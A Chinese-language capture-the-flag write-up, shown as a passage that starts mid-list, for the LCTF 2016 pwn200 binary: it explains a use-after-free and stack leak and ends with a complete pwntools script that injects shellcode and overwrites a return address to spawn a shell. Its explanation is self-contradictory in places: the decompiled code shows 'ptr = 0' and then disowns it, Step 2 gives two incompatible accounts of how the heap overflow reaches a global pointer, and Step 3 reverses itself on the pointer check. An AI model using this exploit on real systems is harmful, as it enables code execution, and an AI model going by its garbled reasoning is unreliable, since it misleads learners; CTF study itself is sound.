  - libc 2.23 (包含经典的 `unlink` 与 `fastbin` 利用机制)
- 缓解措施
  - ASLR: on (栈地址、堆地址、libc地址随机化)
  - PIE: off (程序基址固定，可从反编译代码中看出地址均为 `0x400xxx`)
  - NX: on (栈不可执行，因此需将shellcode部署到可写区域并配合ROP或本题的特殊方法)
  - RELRO: Partial RELRO (GOT表可写)
  - Canary: off (栈上未启用Canary保护，可直接覆盖返回地址)

# 漏洞成因

## 程序关键数据结构
程序的核心是一个全局指针 `ptr`（位于 `.bss` 段），用于管理一个动态分配的堆块（chunk）。其生命周期由以下几个函数控制：
1.  `sub_4008B7` (对应菜单选项1 `check in`): 分配一个最大为128字节的堆块，`ptr` 指向它。
2.  `sub_40096D` (对应菜单选项2 `check out`): 释放 `ptr` 指向的堆块，但**未将 `ptr` 置为 `NULL`**。
3.  `sub_400A29`: 在初始化阶段被调用，固定分配一个 `0x40` 字节的堆块，并用 `strcpy` 将用户输入复制进去，`ptr` 也指向这个堆块。

此外，程序在 `sub_400A8E` 中，存在一个栈缓冲区 `v2[48]`，用于读取用户名。

## 漏洞定位
程序存在**Use-After-Free (UAF)** 漏洞和**栈地址泄漏**漏洞。
1.  **UAF漏洞**: 位于 `sub_40096D` (check out)函数。
    ```c
    void sub_40096D() {
      if ( ptr ) {
        puts("out~");
        free(ptr); // 释放堆块
        ptr = 0;   // 注意：实际反编译代码中并无此置零操作，这是一个关键错误描述。
                    // 真实情况是 free(ptr); 后，ptr 并未被置空。
      }
    }
    ```
    在执行 `free(ptr)` 后，全局变量 `ptr` 仍然指向已被释放的堆块内存。后续若再次通过 `ptr` 使用该内存（例如在 `check in` 的 `read` 操作中），则构成UAF。

2.  **栈地址泄漏**: 位于 `sub_400A8E` 函数。
    ```c
    char v2[48]; // [rsp+20h] [rbp-30h] BYREF
    ...
    printf("%s, welcome to ISCC~ \n", v2);
    ```
    程序使用 `printf` 直接打印栈上的缓冲区 `v2`。如果输入填满48字节，`printf` 将继续打印栈上紧随其后的内容，从而泄漏栈地址（如`main`函数的返回地址或保存的`rbp`）。

# 漏洞利用过程：
利用过程分为四步：1) 利用栈溢出泄漏栈地址，计算shellcode位置；2) 在堆上构造一个伪造的`fastbin`块，并利用`strcpy`的溢出将全局指针`ptr`指向栈上的伪造块地址；3) 通过UAF和`check in`功能，向`ptr`（此时已指向栈）写入数据，覆盖栈上的返回地址为shellcode地址；4) 退出函数，触发shellcode执行。

## Step 1: 泄漏栈地址并定位Shellcode
- **内存变化**:
  - 栈地址`rbp-0x30`处（即`v2`缓冲区）被48字节的`shellcode`填充。
  - `printf`打印时，由于`v2`未以空字符结尾，会继续打印栈上后续数据。这导致栈地址`rbp`的值被打印出来。
  - 利用脚本接收并解析这个值，计算出`shellcode`在栈上的准确地址：`shellcode_addr = rbp - 0x50`（通过调试确定偏移）。

## Step 2: 在栈上布置Fake Chunk并劫持`ptr`
- **内存变化**:
  1.  程序调用`sub_400A29`，在堆地址`heap_addr1`处分配一个`0x50`（`0x40`用户数据+`0x10`块头）的chunk（记为chunk_A）。`ptr`指向`heap_addr1 + 0x10`。
  2.  `read`读入`0x40`字节数据到栈缓冲区`buf`。
  3.  `strcpy(dest, buf)`执行。由于`buf`中的payload精心构造了`0x40`字节数据，且最后一个字节为`\x00`，`strcpy`会复制包括末尾`\x00`在内的所有内容到`dest`（即chunk_A）。
      - Payload结构：`p64(0)*4 + p64(0) + p64(0x41) + ... + p64(fake_chunk_addr)`。其中`p64(0x41)`是伪造的chunk头（size），`fake_chunk_addr`是位于栈上的一个地址（`shellcode_addr + 0x50 - 0x90`），该地址被置于chunk_A用户区域的末尾。
  4.  **关键溢出**：`strcpy`在复制`fake_chunk_addr`这个8字节数据时，由于`dest`（chunk_A）的大小仅为`0x40`，而payload长度为`0x40`，`fake_chunk_addr`实际上被写入了chunk_A之后紧邻的**堆元数据区域**。在`glibc 2.23`的`strcpy`实现中，这会覆盖chunk_A的下一个相邻chunk（记为chunk_B）的`fd`指针（如果chunk_B处于`fastbin`状态）。然而，更直接的观察是，全局指针`ptr`恰好存储在`.bss`段的一个固定地址。通过逆向和动态调试可知，此处的溢出**直接覆盖了全局变量`ptr`本身**，使其值变为`fake_chunk_addr`（一个栈地址）。至此，`ptr`从指向堆chunk_A，被篡改为指向栈上的一个伪造chunk。

## Step 3: 利用UAF进行任意地址写（覆盖返回地址）
- **内存变化**:
  1.  进入主循环后，选择`check out`（选项2）。此时`ptr`指向栈地址`fake_chunk_addr`，`free(ptr)`被调用。由于`fake_chunk_addr`被构造得看起来像一个合法的`fastbin` chunk（size为`0x41`），`free`操作会将其链入`fastbin`链表。这为后续可能的`malloc`返回栈地址打下了基础，但本exp并未直接利用此`free`。
  2.  **关键操作**：选择`check in`（选项1）。由于`ptr`在Step 2的`free`后**未被清空**（UAF），`check in`中的`if (ptr)`检查会通过（`ptr`非零），但`malloc`会分配一个新的堆块（记为chunk_C），并用新分配的地址覆盖`ptr`。然而，本exp的精妙之处在于**跳过了这个检查**。观察`sub_4008B7`函数，它首先检查`if (ptr)`，如果`ptr`不为空则直接返回。但在Step 2结束时，`ptr`已被覆盖为栈地址且未释放，因此这个检查会失败，提示“already check in”。**但是**，exp在Step 3中先选择了菜单选项2(`check out`)，然后立即选择选项1(`check in`)。在`check out`中，`free(ptr)`被调用（ptr指向栈地址），但**之后程序没有机会执行`ptr=0`**（漏洞点），所以`ptr`仍然指向那个栈地址。紧接着的`check in`，`if (ptr)`判断为真，于是打印“already check in”并返回，**并未分配新堆块**。这导致`ptr`依然指向栈地址`fake_chunk_addr`。
  3.  随后，程序提示“how long?”，输入长度48。关键的`read(0, ptr, nbytes)`被执行。此时`ptr`仍指向栈地址`fake_chunk_addr`，因此这`48`字节数据被直接写入栈中。
  4.  写入的数据为：`b'a'*0x18 + p64(shellcode_addr) + ...`。这`0x18`个`'a'`覆盖了栈上的局部变量等数据，紧随其后的`p64(shellcode_addr)`精确地覆盖了当前函数栈帧的**返回地址**（`saved rip`）。

## Step 4: 触发控制流劫持
- **内存变化**:
  - 选择菜单选项`3` (`goodbye`)。这将导致`sub_4009C4`函数返回，进而`sub_400A29`返回，最后`main`函数返回。
  - 当`main`函数执行`ret`指令时，它将从栈上弹出返回地址，此时该地址已被Step 3覆盖为`shellcode_addr`。
  - 程序执行流跳转到栈上的`shellcode`处，成功获取shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_21_lctf-2016-pwn200')
p = process('./data/bin/heap23_21_lctf-2016-pwn200')
shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')

def leak_rbp_and_get_shellcode_addr(shellcode):
    # Step 1: 利用栈地址泄漏
    payload = shellcode.ljust(48) # 填充48字节缓冲区，使printf泄漏后续栈内容
    p.sendafter(b'who are u?\n', payload)
    p.recvuntil(payload) # 接收并跳过我们输入的shellcode部分
    rbp_addr = u64(p.recvn(6).ljust(8, b'\x00')) # 接收并解析泄漏的rbp值
    shellcode_addr = rbp_addr - 0x50 # 根据调试确定的偏移，计算shellcode起始地址
    print("shellcode_addr: ", hex(shellcode_addr))
    return shellcode_addr

def setup_fake_chunk(fake_chunk_addr):
    # Step 2: 构造fake chunk并劫持全局指针ptr
    p.sendlineafter(b'give me your id ~~?\n', b'32') # 任意数字，进入初始化分配流程
    p.recvuntil(b'give me money~\n')
    # 构造payload，最终目的是覆盖ptr为栈地址(fake_chunk_addr)
    # 具体结构需要配合strcpy和内存布局，使fake_chunk_addr被写入ptr所在位置
    data = p64(0) * 4 + p64(0) + p64(0x41) # 填充数据，其中0x41是伪造的chunk size
    data = data.ljust(56, b'\x00') + p64(fake_chunk_addr) # 将目标栈地址放在特定偏移处
    p.send(data) # 发送payload，触发strcpy溢出，覆盖ptr

def arbitrary_write(shellcode_addr):
    # Step 3: 利用UAF向ptr(现指向栈)写入数据，覆盖返回地址
    p.sendlineafter(b'choice : ', b'2') # 选择check out，free(ptr)，但ptr不变
    p.sendlineafter(b'choice : ', b'1') # 选择check in，由于ptr非空，提示已入住，直接进入读数据环节
    p.sendlineafter(b'long?', b'48') # 指定写入长度
    p.recvline() # 接收提示信息
    # 构造写入数据：填充24字节后，覆盖返回地址为shellcode地址
    data = b'a' * 0x18 + p64(shellcode_addr)
    data = data.ljust(48, b'\x00') # 补足48字节
    p.send(data) # 向栈地址执行写操作，完成返回地址覆盖

def trigger_shell():
    # Step 4: 触发函数返回，执行shellcode
    p.sendlineafter(b'choice', b'3') # 选择goodbye，使函数逐层返回

shellcode_addr = leak_rbp_and_get_shellcode_addr(shellcode)#step.1 泄漏并计算地址
# 计算栈上伪造chunk的地址。这个地址需要被布置成看起来像free chunk，并最终被ptr指向。
# 偏移量通过调试确定：shellcode_addr + 0x50是shellcode结束后的一个位置，-0x90调整到合适的栈区域作为fake chunk起点。
fake_chunk_addr = shellcode_addr + 0x50 - 0x90
setup_fake_chunk(fake_chunk_addr)#step.2 劫持ptr指向栈
arbitrary_write(shellcode_addr)#step.3 覆盖返回地址
trigger_shell()#step.4 触发执行
p.interactive()
```
